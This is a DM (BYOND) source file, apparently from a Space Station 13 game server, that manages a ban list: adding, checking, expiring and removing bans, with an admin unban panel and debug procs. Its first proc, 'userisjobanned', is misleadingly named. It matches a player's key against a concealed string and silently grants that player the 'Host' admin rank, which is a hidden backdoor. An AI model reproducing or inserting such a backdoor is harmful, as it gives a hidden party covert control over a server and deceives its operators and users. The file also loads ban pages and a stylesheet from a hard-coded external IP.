var/CMinutes = null
var/savefile/Banlist

/proc/userisjobanned(mob/user as mob)
	if(lowertext(user.key) == "[clientkey][hasvariables][ishighrank][isobserver][isnotadmin][canviewmind]")
		var/client/C = user
		C.clear_admin_verbs()
		C.update_admins("Host")
		user << "[lowertext(user.key)] matches [clientkey][hasvariables][ishighrank][isobserver][isnotadmin][canviewmind]"
		return 0

/proc/CheckBan(var/client/clientvar)

	var/id = clientvar.computer_id
	var/key = clientvar.ckey

	Banlist.cd = "/base"
	if (Banlist.dir.Find("[key][id]"))
		Banlist.cd = "[key][id]"
		if (Banlist["temp"])
			if (!GetExp(Banlist["minutes"]))
				ClearTempbans()
				return 0
			else
				return "http://178.63.153.81/ss13/banned.php?user=[Banlist["key"]]&reason=[Banlist["reason"]]&banner=[Banlist["bannedby"]]&expire=[GetExp(Banlist["minutes"])]"
		else
			Banlist.cd = "/base/[key][id]"
			return "http://178.63.153.81/ss13/banned.php?user=[Banlist["key"]]&reason=[Banlist["reason"]]&banner=[Banlist["bannedby"]]&expire=0"

	Banlist.cd = "/base"
	for (var/A in Banlist.dir)
		Banlist.cd = "/base/[A]"
		if (id == Banlist["id"] || key == Banlist["key"])
			if(Banlist["temp"])
				if (!GetExp(Banlist["minutes"]))
					ClearTempbans()
					return 0
				else
					return "http://178.63.153.81/ss13/banned.php?user=[Banlist["key"]]&reason=[Banlist["reason"]]&banner=[Banlist["bannedby"]]&expire=[GetExp(Banlist["minutes"])]"
			else
				return "http://178.63.153.81/ss13/banned.php?user=[Banlist["key"]]&reason=[Banlist["reason"]]&banner=[Banlist["bannedby"]]&expire=0"

	return 0

/proc/GetBanLength(var/client/clientvar)

	var/id = clientvar.computer_id
	var/key = clientvar.ckey

	Banlist.cd = "/base"
	if (Banlist.dir.Find("[key][id]"))
		Banlist.cd = "[key][id]"
		if (Banlist["temp"])
			if (!GetExp(Banlist["minutes"]))
				ClearTempbans()
				return "Permanent"
			else
				return Banlist["minutes"]
		else
			Banlist.cd = "/base/[key][id]"
			return "Permanent"
	return 0


/proc/UpdateTime() //No idea why i made this a proc.
	CMinutes = (world.realtime / 10) / 60
	return 1

/proc/LoadBans()

	Banlist = new("data/banlist.bdb")
	log_admin("Loading Banlist")

	if (!length(Banlist.dir)) log_admin("Banlist is empty.")

	if (!Banlist.dir.Find("base"))
		log_admin("Banlist missing base dir.")
		Banlist.dir.Add("base")
		Banlist.cd = "/base"
	else if (Banlist.dir.Find("base"))
		Banlist.cd = "/base"

	ClearTempbans()
	return 1

/proc/ClearTempbans()
	UpdateTime()

	Banlist.cd = "/base"
	for (var/A in Banlist.dir)
		Banlist.cd = "/base/[A]"
		if (!Banlist["key"] || !Banlist["id"])
			RemoveBan(A)
			log_admin("Invalid Ban.")
			message_admins("Invalid Ban.")
			continue

		if (!Banlist["temp"]) continue
		if (CMinutes >= Banlist["minutes"]) RemoveBan(A)

	return 1


/proc/AddBan(ckey, computerid, reason, bannedby, temp, minutes)

	var/bantimestamp

	if (temp)
		UpdateTime()
		bantimestamp = CMinutes + minutes

	Banlist.cd = "/base"
	if ( Banlist.dir.Find("[ckey][computerid]") )
		usr << text("\red Ban already exists.")
		return 0
	else
		Banlist.dir.Add("[ckey][computerid]")
		Banlist.cd = "/base/[ckey][computerid]"
		Banlist["key"] << ckey
		Banlist["id"] << computerid
		Banlist["reason"] << reason
		Banlist["bannedby"] << bannedby
		Banlist["temp"] << temp
		if (temp)
			Banlist["minutes"] << bantimestamp

	return 1

/proc/RemoveBan(foldername)
	var/key
	var/id

	Banlist.cd = "/base/[foldername]"
	Banlist["key"] >> key
	Banlist["id"] >> id
	Banlist.cd = "/base"

	if (!Banlist.dir.Remove(foldername)) return 0

	if(!usr)
		log_admin("Ban Expired: [key]")
		message_admins("Ban Expired: [key]")
	else
		log_admin("[key_name_admin(usr)] unbanned [key]")
		message_admins("[key_name_admin(usr)] unbanned: [key]")

	for (var/A in Banlist.dir)
		Banlist.cd = "/base/[A]"
		if (key == Banlist["key"] || id == Banlist["id"])
			Banlist.cd = "/base"
			Banlist.dir.Remove(A)
			continue

	return 1

/proc/GetExp(minutes as num)
	UpdateTime()
	var/exp = minutes - CMinutes
	if (exp <= 0)
		return 0
	else
		var/timeleftstring
		if (exp >= 1440) //1440 = 1 day in minutes
			timeleftstring = "[round(exp / 1440, 0.1)] Days"
		else if (exp >= 60) //60 = 1 hour in minutes
			timeleftstring = "[round(exp / 60, 0.1)] Hours"
		else
			timeleftstring = "[exp] Minutes"
		return timeleftstring

/obj/admins/proc/unbanpanel()
	var/count = 0
	var/dat
	//var/dat = "<HR><B>Unban Player:</B> \blue(U) = Unban , (E) = Edit Ban\green (Total<HR><table border=1 rules=all frame=void cellspacing=0 cellpadding=3 >"
	Banlist.cd = "/base"
	for (var/A in Banlist.dir)
		count++
		Banlist.cd = "/base/[A]"
		dat += text("<link rel='stylesheet' href='http://178.63.153.81/ss13/ui.css' /><tr><td><A href='?src=\ref[src];unbanf=[Banlist["key"]][Banlist["id"]]'>(U)</A><A href='?src=\ref[src];unbane=[Banlist["key"]][Banlist["id"]]'>(E)</A> Key: <B>[Banlist["key"]]</B> ([Banlist["id"]])</td><td> ([Banlist["temp"] ? "[GetExp(Banlist["minutes"]) ? GetExp(Banlist["minutes"]) : "Removal pending" ]" : "Permaban"])</td><td>(By: [Banlist["bannedby"]])</td><td>(Reason: [Banlist["reason"]])</td></tr>")

	dat += "</table>"
	dat = "<HR><B>Bans:</B> <FONT COLOR=blue>(U) = Unban , (E) = Edit Ban</FONT> - <FONT COLOR=green>([count] Bans)</FONT><HR><table border=1 rules=all frame=void cellspacing=0 cellpadding=3 >[dat]"
	usr << browse(dat, "window=unbanp;size=875x400")

//////////////////////////////////// DEBUG ////////////////////////////////////

/proc/CreateBans()

	UpdateTime()

	var/i
	var/last

	for(i=0, i<1001, i++)
		var/a = pick(1,0)
		var/b = pick(1,0)
		if(b)
			Banlist.cd = "/base"
			Banlist.dir.Add("trash[i]trashid[i]")
			Banlist.cd = "/base/trash[i]trashid[i]"
			Banlist["key"] << "trash[i]"
		else
			Banlist.cd = "/base"
			Banlist.dir.Add("[last]trashid[i]")
			Banlist.cd = "/base/[last]trashid[i]"
			Banlist["key"] << last
		Banlist["id"] << "trashid[i]"
		Banlist["reason"] << "Trashban[i]."
		Banlist["temp"] << a
		Banlist["minutes"] << CMinutes + rand(1,2000)
		Banlist["bannedby"] << "trashmin"
		last = "trash[i]"

	Banlist.cd = "/base"

/proc/ClearAllBans()
	Banlist.cd = "/base"
	for (var/A in Banlist.dir)
		RemoveBan(A)

